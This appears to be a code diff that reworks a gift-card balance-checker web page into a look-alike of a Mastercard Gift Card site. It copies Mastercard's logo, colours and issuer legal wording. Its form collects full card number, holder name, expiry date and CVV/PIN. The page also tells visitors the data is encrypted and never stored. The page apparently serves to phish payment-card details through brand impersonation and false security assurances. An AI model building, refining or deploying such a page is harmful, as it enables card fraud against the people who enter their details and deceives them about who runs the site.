@@ -3,18 +3,17 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="Check your Simon Gift Card balance online. Enter your card number and PIN to see your available balance instantly.">
-  <title>Simon Giftcard - Check Your Balance</title>
+  <meta name="description" content="Manage your Mastercard Gift Card. Check balance, review transactions, or activate your card online.">
+  <title>Mastercard Gift Card - Manage Your Card</title>
   <link rel="icon" type="image/svg+xml" href="/favicon.svg?v=3">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
     :root {
-      --simon-blue: #003DA5;
-      --simon-blue-dark: #002D7A;
-      --simon-blue-light: #0051D4;
-      --simon-gold: #C5A96A;
-      --simon-gold-light: #D4BD8A;
+      --mc-orange: #CF4500;
+      --mc-orange-dark: #B03B00;
+      --mc-dark: #1A1A1A;
+      --mc-dark-footer: #2D2D2D;
       --white: #ffffff;
       --bg: #f5f5f5;
       --text: #333333;
@@ -28,23 +27,33 @@
     }
 
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { font-family: var(--font); background: var(--bg); color: var(--text); min-height: 100vh; -webkit-font-smoothing: antialiased; }
+    body { font-family: var(--font); background: var(--white); color: var(--text); min-height: 100vh; -webkit-font-smoothing: antialiased; }
 
     /* Top Banner */
     .top-banner {
-      background: var(--simon-blue);
+      background: var(--mc-dark);
       color: white;
-      text-align: center;
-      padding: 8px 16px;
-      font-size: 0.8rem;
-      letter-spacing: 0.5px;
+      padding: 10px 2rem;
+      font-size: 0.85rem;
+      display: flex;
+      justify-content: flex-end;
+      align-items: center;
     }
+    .top-banner a {
+      color: white;
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-weight: 500;
+    }
+    .top-banner a:hover { text-decoration: underline; }
 
     /* Header */
     .header {
       background: var(--white);
-      border-bottom: 3px solid var(--simon-gold);
       padding: 0 2rem;
+      border-bottom: 1px solid var(--border-light);
     }
     .header-inner {
       max-width: 1200px;
@@ -57,125 +66,113 @@
     .logo {
       display: flex;
       align-items: center;
-      gap: 12px;
       text-decoration: none;
-      color: var(--simon-blue);
     }
-    .logo-icon {
-      width: 44px;
-      height: 44px;
-      background: var(--simon-blue);
-      border-radius: 8px;
+    .logo-circles {
       display: flex;
       align-items: center;
-      justify-content: center;
-      color: white;
-      font-weight: 800;
-      font-size: 1.1rem;
-      letter-spacing: -0.5px;
     }
-    .logo-text {
-      font-size: 1.6rem;
-      font-weight: 800;
-      color: var(--simon-blue);
-      letter-spacing: -0.5px;
+    .logo-circle-red {
+      width: 40px;
+      height: 40px;
+      background: #EB001B;
+      border-radius: 50%;
+      position: relative;
+      z-index: 2;
     }
-    .logo-sub {
-      font-size: 0.7rem;
-      color: var(--simon-gold);
-      font-weight: 600;
-      text-transform: uppercase;
-      letter-spacing: 2px;
-      margin-top: -2px;
+    .logo-circle-orange {
+      width: 40px;
+      height: 40px;
+      background: #F79E1B;
+      border-radius: 50%;
+      margin-left: -14px;
+      position: relative;
+      z-index: 1;
     }
 
     .nav {
       display: flex;
-      gap: 0;
-      height: 100%;
-      align-items: stretch;
+      gap: 2rem;
+      align-items: center;
     }
     .nav a {
       color: var(--text);
       text-decoration: none;
       font-weight: 600;
-      font-size: 0.875rem;
-      padding: 0 1.25rem;
-      display: flex;
-      align-items: center;
-      border-bottom: 3px solid transparent;
-      margin-bottom: -3px;
-      transition: all 0.2s;
+      font-size: 0.95rem;
+      transition: color 0.2s;
     }
-    .nav a:hover { color: var(--simon-blue); border-bottom-color: var(--simon-blue); }
-    .nav a.active { color: var(--simon-blue); border-bottom-color: var(--simon-blue); }
+    .nav a:hover { color: var(--mc-orange); }
+    .nav a.active { color: var(--mc-orange); }
 
     /* Hero Section */
     .hero {
-      background: linear-gradient(135deg, var(--simon-blue) 0%, var(--simon-blue-dark) 100%);
-      padding: 3rem 2rem;
-      text-align: center;
-      color: white;
+      background: var(--mc-dark);
       position: relative;
       overflow: hidden;
+      min-height: 520px;
+      display: flex;
     }
-    .hero::before {
-      content: "";
-      position: absolute;
-      top: -50%;
-      right: -20%;
-      width: 60%;
-      height: 200%;
-      background: rgba(255,255,255,0.03);
-      transform: rotate(20deg);
-    }
-    .hero h1 {
-      font-size: 2.25rem;
-      font-weight: 800;
-      margin-bottom: 0.5rem;
-      letter-spacing: -0.5px;
-    }
-    .hero p {
-      font-size: 1.05rem;
-      opacity: 0.85;
-      max-width: 500px;
+    .hero-content {
+      max-width: 1200px;
       margin: 0 auto;
-    }
-
-    /* Main Content */
-    .main-content {
-      max-width: 1100px;
-      margin: -2rem auto 3rem;
+      width: 100%;
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      position: relative;
       padding: 0 2rem;
+    }
+    .hero-form-area {
+      display: flex;
+      align-items: flex-start;
+      padding: 3rem 0;
+      z-index: 2;
+    }
+    .hero-image-area {
       position: relative;
       z-index: 1;
     }
-    .content-grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 2rem;
-      align-items: start;
+    .hero-image-area img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
     }
-    @media (max-width: 850px) {
-      .content-grid { grid-template-columns: 1fr; }
+    .hero-image-placeholder {
+      width: 100%;
+      height: 100%;
+      background: url('https://i.pinimg.com/736x/9d/b0/35/9db035cc1ff79f0b5c715a59259654c8.jpg') center center / cover no-repeat;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
 
-    /* Card Form Section */
+    /* Gift card image in hero */
+    .hero-gift-card {
+      position: absolute;
+      bottom: 40px;
+      right: 40px;
+      width: 280px;
+      z-index: 3;
+    }
+
+    /* Card Form */
     .form-card {
       background: var(--white);
-      border-radius: 12px;
+      border-radius: 0;
       padding: 2.5rem;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-      border: 1px solid var(--border-light);
+      width: 100%;
+      max-width: 480px;
+      border-top: 5px solid var(--mc-orange);
+      box-shadow: 0 4px 30px rgba(0,0,0,0.2);
     }
     .form-card h2 {
-      font-size: 1.35rem;
+      font-size: 1.4rem;
       font-weight: 700;
-      color: var(--simon-blue);
-      margin-bottom: 0.4rem;
+      color: var(--text);
+      margin-bottom: 0.5rem;
     }
     .form-card .subtitle {
-      color: var(--text-muted);
+      color: var(--mc-orange);
       font-size: 0.9rem;
       margin-bottom: 1.75rem;
       line-height: 1.5;
@@ -187,19 +184,19 @@
     .form-group label {
       display: block;
       font-size: 0.85rem;
-      font-weight: 600;
+      font-weight: 700;
       color: var(--text);
-      margin-bottom: 0.4rem;
+      margin-bottom: 0.5rem;
     }
     .form-group label .required {
       color: var(--error);
     }
     .form-group input {
       width: 100%;
-      padding: 0.75rem 1rem;
+      padding: 0.85rem 1rem;
       font-size: 0.95rem;
       border: 1px solid var(--border);
-      border-radius: 6px;
+      border-radius: 4px;
       transition: all 0.2s;
       font-family: inherit;
       color: var(--text);
@@ -207,10 +204,10 @@
     }
     .form-group input:focus {
       outline: 0;
-      border-color: var(--simon-blue);
-      box-shadow: 0 0 0 3px rgba(0, 61, 165, 0.1);
+      border-color: var(--mc-orange);
+      box-shadow: 0 0 0 3px rgba(207, 69, 0, 0.1);
     }
-    .form-group input::placeholder { color: #bbb; }
+    .form-group input::placeholder { color: #999; }
     .form-group input.error { border-color: var(--error); }
 
     .card-number-wrapper {
@@ -258,7 +255,7 @@
       margin-top: 0.4rem;
       padding: 0.6rem 0.75rem;
       background: #f8f9fa;
-      border-radius: 6px;
+      border-radius: 4px;
       font-size: 0.78rem;
       color: var(--text-muted);
       line-height: 1.4;
@@ -266,16 +263,16 @@
     .pin-hint svg {
       flex-shrink: 0;
       margin-top: 1px;
-      color: var(--simon-blue);
+      color: var(--mc-orange);
     }
 
     .btn-check {
-      background: var(--simon-blue);
+      background: var(--mc-orange);
       color: white;
-      padding: 0.85rem 2rem;
-      border-radius: 6px;
+      padding: 0.95rem 2rem;
+      border-radius: 4px;
       border: none;
-      font-size: 1rem;
+      font-size: 1.05rem;
       font-weight: 700;
       cursor: pointer;
       width: 100%;
@@ -286,17 +283,18 @@
       justify-content: center;
       gap: 8px;
       letter-spacing: 0.3px;
+      text-transform: none;
     }
-    .btn-check:hover { background: var(--simon-blue-dark); }
+    .btn-check:hover { background: var(--mc-orange-dark); }
     .btn-check:active { transform: scale(0.99); }
     .btn-check:disabled { opacity: 0.65; cursor: not-allowed; }
 
     .btn-another {
       background: var(--white);
-      color: var(--simon-blue);
+      color: var(--mc-orange);
       padding: 0.75rem 2rem;
-      border-radius: 6px;
-      border: 2px solid var(--simon-blue);
+      border-radius: 4px;
+      border: 2px solid var(--mc-orange);
       font-size: 0.95rem;
       font-weight: 700;
       cursor: pointer;
@@ -305,142 +303,8 @@
       margin-top: 1rem;
       display: none;
     }
-    .btn-another:hover { background: var(--simon-blue); color: white; }
+    .btn-another:hover { background: var(--mc-orange); color: white; }
     .btn-another.show { display: block; }
-
-    /* Info Section */
-    .info-card {
-      background: var(--white);
-      border-radius: 12px;
-      padding: 2rem;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-      border: 1px solid var(--border-light);
-    }
-
-    /* Gift Card Visual */
-    .gc-visual {
-      width: 100%;
-      aspect-ratio: 1.6/1;
-      background: linear-gradient(135deg, var(--simon-blue) 0%, #001F5C 100%);
-      border-radius: 12px;
-      padding: 1.75rem;
-      color: white;
-      position: relative;
-      overflow: hidden;
-      margin-bottom: 1.5rem;
-      box-shadow: 0 8px 24px rgba(0, 61, 165, 0.3);
-    }
-    .gc-visual::before {
-      content: "";
-      position: absolute;
-      top: -30%;
-      right: -15%;
-      width: 50%;
-      height: 160%;
-      background: rgba(255,255,255,0.04);
-      transform: rotate(20deg);
-    }
-    .gc-visual::after {
-      content: "";
-      position: absolute;
-      bottom: 0;
-      left: 0;
-      right: 0;
-      height: 4px;
-      background: var(--simon-gold);
-    }
-    .gc-brand {
-      font-size: 1.35rem;
-      font-weight: 800;
-      letter-spacing: -0.5px;
-      margin-bottom: 0.25rem;
-    }
-    .gc-type {
-      font-size: 0.7rem;
-      text-transform: uppercase;
-      letter-spacing: 3px;
-      opacity: 0.7;
-      font-weight: 600;
-    }
-    .gc-chip {
-      width: 40px;
-      height: 30px;
-      background: linear-gradient(135deg, #ffd700, #daa520);
-      border-radius: 5px;
-      margin: 1.25rem 0;
-      position: relative;
-      overflow: hidden;
-    }
-    .gc-chip::after {
-      content: "";
-      position: absolute;
-      inset: 0;
-      background: repeating-linear-gradient(90deg, transparent, transparent 5px, rgba(0,0,0,0.08) 5px, rgba(0,0,0,0.08) 10px);
-    }
-    .gc-number {
-      font-family: 'Courier New', monospace;
-      font-size: 1.2rem;
-      letter-spacing: 3px;
-      margin-bottom: 1rem;
-      text-shadow: 0 1px 3px rgba(0,0,0,0.3);
-    }
-    .gc-bottom {
-      display: flex;
-      justify-content: space-between;
-      align-items: flex-end;
-    }
-    .gc-label {
-      font-size: 0.55rem;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      opacity: 0.6;
-      margin-bottom: 2px;
-    }
-    .gc-value {
-      font-size: 0.85rem;
-      font-weight: 600;
-    }
-
-    /* Info Items */
-    .info-title {
-      font-size: 1.1rem;
-      font-weight: 700;
-      color: var(--simon-blue);
-      margin-bottom: 1rem;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-    .info-item {
-      display: flex;
-      gap: 12px;
-      margin-bottom: 1rem;
-      padding-bottom: 1rem;
-      border-bottom: 1px solid var(--border-light);
-    }
-    .info-item:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
-    .info-icon {
-      width: 36px;
-      height: 36px;
-      background: #f0f4ff;
-      border-radius: 8px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-shrink: 0;
-      color: var(--simon-blue);
-    }
-    .info-text h4 {
-      font-size: 0.85rem;
-      font-weight: 700;
-      color: var(--text);
-      margin-bottom: 2px;
-    }
-    .info-text p {
-      font-size: 0.8rem;
-      color: var(--text-muted);
-      line-height: 1.4;
-    }
 
     /* Balance Result */
     .balance-result {
@@ -456,13 +320,13 @@
     .balance-result.success .result-box {
       background: #f0fdf4;
       border: 1px solid #bbf7d0;
-      border-radius: 12px;
+      border-radius: 8px;
       padding: 2rem;
     }
     .balance-result.error .result-box {
       background: #fef2f2;
       border: 1px solid #fecaca;
-      border-radius: 12px;
+      border-radius: 8px;
       padding: 2rem;
     }
     .result-icon {
@@ -498,7 +362,7 @@
     .amount {
       font-size: 3rem;
       font-weight: 800;
-      color: var(--simon-blue);
+      color: var(--mc-orange);
       letter-spacing: -1px;
     }
     .card-info {
@@ -516,7 +380,7 @@
     .loading-overlay {
       position: fixed;
       inset: 0;
-      background: rgba(0, 30, 80, 0.85);
+      background: rgba(26, 26, 26, 0.85);
       backdrop-filter: blur(4px);
       display: none;
       align-items: center;
@@ -531,7 +395,7 @@
       width: 44px;
       height: 44px;
       border: 4px solid rgba(255,255,255,0.15);
-      border-top-color: var(--simon-gold);
+      border-top-color: var(--mc-orange);
       border-radius: 50%;
       animation: spin 0.8s linear infinite;
     }
@@ -548,7 +412,7 @@
 
     .content-section {
       background: var(--white);
-      border-radius: 12px;
+      border-radius: 8px;
       padding: 2.5rem;
       box-shadow: 0 4px 20px rgba(0,0,0,0.08);
       border: 1px solid var(--border-light);
@@ -558,7 +422,7 @@
     .content-section h2 {
       font-size: 1.75rem;
       font-weight: 800;
-      color: var(--simon-blue);
+      color: var(--text);
       margin-bottom: 1rem;
     }
     .content-section p {
@@ -581,59 +445,140 @@
     }
     .faq-item p { margin-bottom: 0; font-size: 0.925rem; }
 
+    /* Sub-page hero */
+    .hero-simple {
+      background: var(--mc-dark);
+      padding: 3rem 2rem;
+      text-align: center;
+      color: white;
+    }
+    .hero-simple h1 {
+      font-size: 2rem;
+      font-weight: 800;
+      margin-bottom: 0.5rem;
+    }
+    .hero-simple p {
+      font-size: 1rem;
+      opacity: 0.7;
+      max-width: 500px;
+      margin: 0 auto;
+    }
+
     /* Footer */
     .footer {
-      background: var(--simon-blue-dark);
+      background: var(--mc-dark);
       color: rgba(255,255,255,0.7);
-      padding: 2rem;
-      text-align: center;
-      font-size: 0.8rem;
-      margin-top: 3rem;
+      padding: 0;
+      margin-top: 0;
     }
-    .footer a { color: rgba(255,255,255,0.85); text-decoration: none; }
-    .footer a:hover { color: white; text-decoration: underline; }
+    .footer-top {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 2.5rem 2rem 1.5rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid rgba(255,255,255,0.1);
+    }
+    .footer-logo {
+      display: flex;
+      align-items: center;
+    }
+    .footer-logo .logo-circle-red {
+      width: 30px;
+      height: 30px;
+    }
+    .footer-logo .logo-circle-orange {
+      width: 30px;
+      height: 30px;
+      margin-left: -10px;
+    }
+    .footer-top a {
+      color: white;
+      text-decoration: none;
+      font-weight: 700;
+      font-size: 0.95rem;
+    }
+    .footer-top a:hover { text-decoration: underline; }
+
+    .footer-legal {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 1.5rem 2rem;
+      font-size: 0.8rem;
+      line-height: 1.6;
+      color: rgba(255,255,255,0.6);
+    }
+    .footer-legal p {
+      margin-bottom: 1rem;
+    }
+    .footer-legal a {
+      color: rgba(255,255,255,0.8);
+      text-decoration: underline;
+    }
+    .footer-legal a:hover { color: white; }
+
+    .footer-bottom {
+      border-top: 1px solid rgba(255,255,255,0.1);
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 1.5rem 2rem;
+    }
     .footer-links {
       display: flex;
-      justify-content: center;
-      gap: 1.5rem;
-      margin-bottom: 1rem;
+      gap: 2rem;
       flex-wrap: wrap;
     }
+    .footer-links a {
+      color: rgba(255,255,255,0.7);
+      text-decoration: none;
+      font-size: 0.85rem;
+      font-weight: 500;
+    }
+    .footer-links a:hover { color: white; text-decoration: underline; }
 
     .hide { display: none !important; }
 
     /* Mobile */
+    @media (max-width: 850px) {
+      .hero-content { grid-template-columns: 1fr; }
+      .hero-image-area { display: none; }
+      .hero { min-height: auto; }
+      .hero-form-area { padding: 2rem 0; }
+      .form-card { max-width: 100%; }
+    }
     @media (max-width: 600px) {
       .header-inner { padding: 0 0.5rem; }
-      .nav a { padding: 0 0.75rem; font-size: 0.8rem; }
-      .hero h1 { font-size: 1.5rem; }
-      .hero p { font-size: 0.9rem; }
-      .main-content { padding: 0 1rem; }
-      .form-card, .info-card { padding: 1.5rem; }
+      .nav { gap: 1rem; }
+      .nav a { font-size: 0.85rem; }
+      .form-card { padding: 1.5rem; }
       .form-row { grid-template-columns: 1fr; }
+      .footer-links { gap: 1rem; }
+      .footer-top { flex-direction: column; gap: 1rem; align-items: flex-start; }
     }
   </style>
 </head>
 <body>
   <!-- Top Banner -->
   <div class="top-banner">
-    Secure Gift Card Balance Verification
+    <a href="/faq" class="nav-link" data-page="faq">
+      Have a Problem?
+      <svg width="14" height="14" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
+    </a>
   </div>
 
   <!-- Header -->
   <header class="header">
     <div class="header-inner">
-      <a href="/" class="logo">
-        <div class="logo-icon">S</div>
-        <div>
-          <div class="logo-text">Simon</div>
-          <div class="logo-sub">Giftcard</div>
+      <a href="/" class="logo nav-link" data-page="home">
+        <div class="logo-circles">
+          <div class="logo-circle-red"></div>
+          <div class="logo-circle-orange"></div>
         </div>
       </a>
       <nav class="nav">
-        <a href="/" class="nav-link" data-page="home">Check Balance</a>
-        <a href="/faq" class="nav-link" data-page="faq">FAQ</a>
-        <a href="/about" class="nav-link" data-page="about">About</a>
+        <a href="/" class="nav-link" data-page="home" style="font-weight:700;">Buy Now</a>
+        <a href="/faq" class="nav-link" data-page="faq" style="font-weight:700;">Help</a>
       </nav>
     </div>
   </header>
@@ -643,122 +588,64 @@
     <!-- HOME PAGE -->
     <section id="page-home" class="page active">
       <div class="hero">
-        <h1>Check Your Gift Card Balance</h1>
-        <p>Enter your card details below to view your current available balance.</p>
-      </div>
+        <div class="hero-content">
+          <!-- Form Side -->
+          <div class="hero-form-area">
+            <div class="form-card">
+              <h2>Manage Your Card</h2>
+              <p class="subtitle">Enter card details to check balance, review transactions, or activate a card</p>
 
-      <div class="main-content">
-        <div class="content-grid">
-          <!-- Form -->
-          <div class="form-card">
-            <h2>Card Information</h2>
-            <p class="subtitle">Please enter the details found on your gift card.</p>
-
-            <form id="balanceForm">
-              <div id="formFields">
-                <div class="form-group">
-                  <label for="cardNumber">Card Number <span class="required">*</span></label>
-                  <div class="card-number-wrapper">
-                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="23" inputmode="numeric" autocomplete="off">
-                    <div class="card-brand-badge" id="cardBrandBadge"><img id="cardBrandImg" src="" alt=""></div>
-                  </div>
-                  <span class="field-error" id="cardError"></span>
-                </div>
-
-                <div class="form-group">
-                  <label for="cardHolder">Card Holder Name <span style="font-weight:400;color:var(--text-light)">(Optional)</span></label>
-                  <input type="text" id="cardHolder" placeholder="Enter name on card" autocomplete="off">
-                </div>
-
-                <div class="form-row">
+              <form id="balanceForm">
+                <div id="formFields">
                   <div class="form-group">
-                    <label for="pin">PIN / Security Code <span class="required">*</span></label>
-                    <input type="password" id="pin" placeholder="Enter PIN" maxlength="4" inputmode="numeric" autocomplete="off">
-                    <span class="field-error" id="pinError"></span>
+                    <label for="cardNumber">Card Number</label>
+                    <div class="card-number-wrapper">
+                      <input type="text" id="cardNumber" placeholder="Card Number" maxlength="23" inputmode="numeric" autocomplete="off">
+                      <div class="card-brand-badge" id="cardBrandBadge"><img id="cardBrandImg" src="" alt=""></div>
+                    </div>
+                    <span class="field-error" id="cardError"></span>
                   </div>
+
                   <div class="form-group">
-                    <label for="expiryDate">Expiration (MM/YY)</label>
-                    <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" inputmode="numeric" autocomplete="off">
-                    <span class="field-error" id="expiryError"></span>
+                    <label for="cardHolder">Card Holder Name <span style="font-weight:400;color:var(--text-light)">(Optional)</span></label>
+                    <input type="text" id="cardHolder" placeholder="Enter name on card" autocomplete="off">
                   </div>
+
+                  <label style="display:block;font-size:0.85rem;font-weight:700;color:var(--text);margin-bottom:0.5rem;">Expiration Date</label>
+                  <div class="form-row" style="grid-template-columns: 1fr 1fr 1fr; gap: 0.75rem; margin-bottom: 1.25rem;">
+                    <div class="form-group" style="margin-bottom:0;">
+                      <input type="text" id="expiryMonth" placeholder="MM" maxlength="2" inputmode="numeric" autocomplete="off">
+                    </div>
+                    <div class="form-group" style="margin-bottom:0;">
+                      <input type="text" id="expiryYear" placeholder="YY" maxlength="2" inputmode="numeric" autocomplete="off">
+                    </div>
+                    <div class="form-group" style="margin-bottom:0; position:relative;">
+                      <input type="password" id="pin" placeholder="CVV" maxlength="4" inputmode="numeric" autocomplete="off">
+                      <div style="position:absolute;right:10px;top:50%;transform:translateY(-50%);width:20px;height:20px;border-radius:50%;background:var(--mc-orange);color:white;display:flex;align-items:center;justify-content:center;font-size:0.75rem;font-weight:700;cursor:help;" title="The CVV/PIN is on the back of your card">?</div>
+                    </div>
+                  </div>
+                  <span class="field-error" id="expiryError"></span>
+                  <span class="field-error" id="pinError"></span>
+
+                  <div class="pin-hint" style="margin-bottom:0.5rem;">
+                    <svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/></svg>
+                    <span>Show Card Info</span>
+                  </div>
+
+                  <button type="submit" class="btn-check" id="submitBtn">
+                    Continue
+                  </button>
                 </div>
 
-                <div class="pin-hint">
-                  <svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
-                  <span>The PIN is located on the back of your card. You may need to scratch off the silver coating to reveal it.</span>
-                </div>
-
-                <button type="submit" class="btn-check" id="submitBtn">
-                  <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
-                  Check Balance
-                </button>
-              </div>
-
-              <div id="result" class="balance-result"></div>
-              <button type="button" class="btn-another" id="checkAnother">Check Another Card</button>
-            </form>
+                <div id="result" class="balance-result"></div>
+                <button type="button" class="btn-another" id="checkAnother">Check Another Card</button>
+              </form>
+            </div>
           </div>
 
-          <!-- Info Sidebar -->
-          <div>
-            <!-- Gift Card Visual -->
-            <div class="info-card" style="margin-bottom: 1.5rem;">
-              <div class="gc-visual">
-                <div class="gc-brand">Simon</div>
-                <div class="gc-type">Gift Card</div>
-                <div class="gc-chip"></div>
-                <div class="gc-number" id="gcNumber">&bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull;</div>
-                <div class="gc-bottom">
-                  <div>
-                    <div class="gc-label">Card Holder</div>
-                    <div class="gc-value" id="gcHolder">GIFT CARD</div>
-                  </div>
-                  <div>
-                    <div class="gc-label">Valid Thru</div>
-                    <div class="gc-value" id="gcExpiry">MM/YY</div>
-                  </div>
-                  <div id="gcBrand" style="height:32px;display:flex;align-items:center;"></div>
-                </div>
-              </div>
-            </div>
-
-            <!-- How It Works -->
-            <div class="info-card">
-              <div class="info-title">
-                <svg width="20" height="20" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg>
-                How It Works
-              </div>
-
-              <div class="info-item">
-                <div class="info-icon">
-                  <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/></svg>
-                </div>
-                <div class="info-text">
-                  <h4>1. Enter Card Details</h4>
-                  <p>Type your 16-digit card number and 4-digit PIN from the back of your card.</p>
-                </div>
-              </div>
-
-              <div class="info-item">
-                <div class="info-icon">
-                  <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
-                </div>
-                <div class="info-text">
-                  <h4>2. Secure Verification</h4>
-                  <p>Your data is encrypted and securely transmitted for balance lookup.</p>
-                </div>
-              </div>
-
-              <div class="info-item">
-                <div class="info-icon">
-                  <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
-                </div>
-                <div class="info-text">
-                  <h4>3. View Balance</h4>
-                  <p>Your available balance is displayed instantly on screen.</p>
-                </div>
-              </div>
-            </div>
+          <!-- Image Side -->
+          <div class="hero-image-area">
+            <div class="hero-image-placeholder"></div>
           </div>
         </div>
       </div>
@@ -766,19 +653,19 @@
 
     <!-- FAQ PAGE -->
     <section id="page-faq" class="page">
-      <div class="hero">
+      <div class="hero-simple">
         <h1>Frequently Asked Questions</h1>
-        <p>Find answers to common questions about Simon Gift Cards.</p>
+        <p>Find answers to common questions about your Gift Card.</p>
       </div>
-      <div class="main-content">
+      <div style="max-width:1100px; margin:0 auto; padding: 0 2rem;">
         <div class="content-section">
           <div class="faq-item">
             <h4>Where do I find my card number?</h4>
-            <p>Your 16-digit card number is printed on the front of your Simon Gift Card.</p>
+            <p>Your 16-digit card number is printed on the front of your Gift Card.</p>
           </div>
           <div class="faq-item">
             <h4>Where is the PIN located?</h4>
-            <p>The 4-digit PIN is on the back of your card. You may need to scratch off the silver coating to reveal it. This PIN is required to check your balance.</p>
+            <p>The PIN/CVV is on the back of your card. You may need to scratch off the silver coating to reveal it.</p>
           </div>
           <div class="faq-item">
             <h4>Is it safe to check my balance here?</h4>
@@ -786,11 +673,11 @@
           </div>
           <div class="faq-item">
             <h4>Why does my card show a zero balance?</h4>
-            <p>A zero balance can occur if the card has not been activated, the funds have been fully spent, or the card has expired. Please verify the activation status with your original receipt.</p>
+            <p>A zero balance can occur if the card has not been activated, the funds have been fully spent, or the card has expired.</p>
           </div>
           <div class="faq-item">
             <h4>What card types are supported?</h4>
-            <p>We support Visa and Mastercard gift cards and prepaid cards. American Express Simon cards may require checking balance through a partner site.</p>
+            <p>We support Visa and Mastercard gift cards and prepaid cards.</p>
           </div>
           <div class="faq-item">
             <h4>Is there a fee to check my balance?</h4>
@@ -802,14 +689,14 @@
 
     <!-- ABOUT PAGE -->
     <section id="page-about" class="page">
-      <div class="hero">
-        <h1>About Simon Giftcard</h1>
-        <p>Fast, secure, and free gift card balance checking.</p>
+      <div class="hero-simple">
+        <h1>About Mastercard Gift Card</h1>
+        <p>Manage your card with ease.</p>
       </div>
-      <div class="main-content">
+      <div style="max-width:1100px; margin:0 auto; padding: 0 2rem;">
         <div class="content-section">
-          <p>Simon Gift Cards are the perfect gift for any occasion. They can be used anywhere Visa or Mastercard debit cards are accepted, giving recipients the freedom to choose exactly what they want.</p>
-          <p>Our balance checker provides a fast, secure way to verify your remaining gift card balance without calling a phone number or visiting a store. Simply enter your card number and PIN to see your available funds instantly.</p>
+          <p>Mastercard&reg; Gift Cards are issued by Sutton Bank or Pathward, N.A. pursuant to license by Mastercard International Incorporated, and may be used in the U.S. and District of Columbia everywhere Debit Mastercard cards are accepted.</p>
+          <p>Our balance checker provides a fast, secure way to verify your remaining gift card balance. Simply enter your card number and CVV to see your available funds instantly.</p>
           <p>Your security is our priority. All card information is encrypted during transmission and is never stored on our servers after the balance check is complete.</p>
         </div>
       </div>
@@ -818,12 +705,29 @@
 
   <!-- Footer -->
   <footer class="footer">
-    <div class="footer-links">
-      <a href="/" class="nav-link" data-page="home">Check Balance</a>
-      <a href="/faq" class="nav-link" data-page="faq">FAQ</a>
-      <a href="/about" class="nav-link" data-page="about">About</a>
+    <div class="footer-top">
+      <div class="footer-logo">
+        <div class="logo-circle-red"></div>
+        <div class="logo-circle-orange"></div>
+      </div>
+      <a href="/faq" class="nav-link" data-page="faq">Help</a>
     </div>
-    <p>&copy; 2026 Simon Giftcard. All rights reserved.</p>
+
+    <div class="footer-legal">
